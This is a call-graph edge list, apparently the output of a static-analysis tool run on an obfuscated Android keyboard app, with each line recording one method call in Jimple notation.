VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <ivw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ivw: void <clinit>()>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, $i1, $r3) in <lqk: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <lum: java.lang.String[] o()>() in <luk: void <clinit>()> ==> <lum: java.lang.String[] o()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r1.<com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Object cast(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: void <init>()>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r4) in <lqs: boolean equals(java.lang.Object)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqp: int size()>
CLINIT edge: staticinvoke <lqk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqk: void <clinit>()>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>(0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r5.<lsm: void <init>()>() in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: void <init>()>
SPECIAL edge: specialinvoke $r17.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/inputmethodentry/InputMethodEntryManager") in <hnt: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String substring(int)>($i0) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String substring(int)>
CLINIT edge: staticinvoke <ldr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ldr: void <clinit>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lvt: void <init>(lvr)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r1 = staticinvoke <kwe: miy x(java.lang.Object)>(null) in <her: void <clinit>()> ==> <kwe: miy x(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<mii: void <init>()>() in <mij: void <init>(miy)> ==> <mii: void <init>()>
CLINIT edge: staticinvoke <java.lang.Double: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Double: void <clinit>()>
VIRTUAL edge: $i3 = virtualinvoke $r1.<java.lang.String: int length()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<java.util.Date: void <init>(long)>($l0) in <lsc: void f(java.lang.String,ltn)> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i4) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r1) in <lly: lma g()> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: $z0 = specialinvoke r0.<hbv: boolean o()>() in <hbv: boolean m(java.lang.Object)> ==> <hbv: boolean o()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r7, $i5, $i1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" but determined result is ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r3 = virtualinvoke $r25.<java.lang.Class: java.lang.String getName()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashSet: void <init>(int,float)>($i0, 1.0F) in <ljf: java.util.Set f()> ==> <java.util.LinkedHashSet: void <init>(int,float)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(12) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_GlobalAdditionalImeDefsLoaded", $r5) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i1) in <lkg: void g(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, $i1, $i2) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <hbu: hbs f(java.lang.String,long)>("client_error_logging_level", $l0) in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <hbu: hbs f(java.lang.String,long)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lkx: boolean containsKey(java.lang.Object)>($r1) in <ivw: boolean P()> ==> <lkx: boolean containsKey(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lly g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lma: lly g()>
INTERFACE edge: interfaceinvoke $r1.<java.util.Set: boolean add(java.lang.Object)>($r2) in <ljf: java.util.Set f()> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<hny: void <init>(ivw,java.lang.String)>($r2, $r3) in <hny: hny a(hmm)> ==> <hny: void <init>(ivw,java.lang.String)>
VIRTUAL edge: $l2 = virtualinvoke $r1.<java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>(-4942790177534073029L) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>(0, "No logging platforms found:") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int d(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int f(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.util.Map m()> ==> <ljd: void p()>
STATIC edge: $r12 = staticinvoke <hnc: java.lang.String d(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hnc: java.lang.String d(hmm)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>($r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqm: java.lang.Object get(int)> ==> <iye: void O(int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("invalid maximum depth: 0") in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(1) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <j$.sun.misc.b: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.sun.misc.b: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwk: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r0, null) in <lqq: lqq a(int,java.lang.Object[])> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
CLINIT edge: staticinvoke <androidx.core.content.FileProvider: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <androidx.core.content.FileProvider: void <clinit>()>
SPECIAL edge: specialinvoke $r13.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_METADATA", 13, 13) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: int a()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorImageThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $z0 = virtualinvoke r0.<liz: boolean hasNext()>() in <liz: java.lang.Object next()> ==> <liz: boolean hasNext()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<lkl: void <init>()>() in <lkq: lkl e()> ==> <lkl: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: int size()> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke r0.<lss: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: interfaceinvoke $r0.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(14) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] y()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lmb: void <init>()>() in <hbv: void j()> ==> <lmb: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
CLINIT edge: staticinvoke <jpq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jpq: void <clinit>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("forced", class "Ljava/lang/Boolean;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvr: int size()>() in <lvr: int b()> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqm: void <init>(lqn)> ==> <lkq: void <init>()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("group_by", $r1, 1) in <lsj: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagManager") in <hcb: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: int size()> ==> <ljd: java.util.Map o()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r1, $i3, $i4, $c0, $c1, $i2) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lly: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r9.<mag: void <init>(java.lang.String,int,int)>("AUTOCOMPLETE", 9, 9) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r26.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i9, $r15, $r16, null, null) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>(r0) in <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()> ==> <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $z0 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r1, $r2) in <hbv: boolean o()> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbw: void <init>(int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.lang.Iterable: java.util.Iterator iterator()>() in <izw: java.util.Collection at(java.lang.Iterable)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r1, $i2, $r23) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke r0.<lme: void <init>(lkx,int)>($r1, 0) in <ljs: void <init>()> ==> <lme: void <init>(lkx,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean x(char)>
VIRTUAL edge: virtualinvoke r0.<ljd: int b()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int b()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lje: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(5) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfb: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: java.util.Set f()> ==> <ljf: void h()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r16.<lsu: void <init>()>() in <lsd: boolean b(lsr)> ==> <lsu: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <gsr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gsr: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c3) in <ivw: boolean w(char[],int,int)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lje: void <init>(ljf)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Thread: java.lang.Thread currentThread()>() in <ojg: void v(java.lang.String)> ==> <java.lang.Thread: java.lang.Thread currentThread()>
STATIC edge: $r3 = staticinvoke <lme: lmb g()>() in <hbv: void j()> ==> <lme: lmb g()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<mag: void <init>(java.lang.String,int,int)>("BITMOJI_IMAGE", 15, 15) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Error: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <miv: void <init>(java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lvr: boolean isEmpty()>() in <lvt: boolean a()> ==> <java.util.AbstractMap: boolean isEmpty()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r4, $i0) in <lsn: void q(lsz,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
